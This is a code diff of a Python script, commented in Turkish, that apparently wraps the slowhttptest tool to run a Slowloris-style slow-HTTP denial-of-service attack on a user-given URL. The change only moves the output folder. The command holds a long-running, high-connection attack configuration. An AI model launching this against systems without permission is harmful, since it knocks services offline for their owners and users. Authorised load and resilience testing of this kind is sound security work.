@@ -1,7 +1,11 @@
+import os
 import subprocess
 import sys
 import validators
 import time
+
+OUTPUT_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'outputs')
+os.makedirs(OUTPUT_DIR, exist_ok=True)
 
 def check_slowhttptest_installed():
     """slowhttptest aracının yüklü olup olmadığını kontrol eder."""
@@ -23,9 +27,10 @@ def validate_url(url):
 def run_slowhttptest(url):
     """slowhttptest aracını belirtilen URL üzerinde çalıştırır ve terminale canlı çıktı verir."""
     try:
+        output_dir = os.path.join(OUTPUT_DIR, "slow-test")
         command = [
             "slowhttptest", "-c", "1000", "-H", "-r", "200", "-c", "400", "-i", "10",
-            "-t", "POST", "-l", "3600", "-o", "/home/kali/Documents/BilfenProject/slow-test",
+            "-t", "POST", "-l", "3600", "-o", output_dir,
             "-g", "-u", url
         ]
         print("\nSlowloriss Saldırısı başlatılıyor...\n")
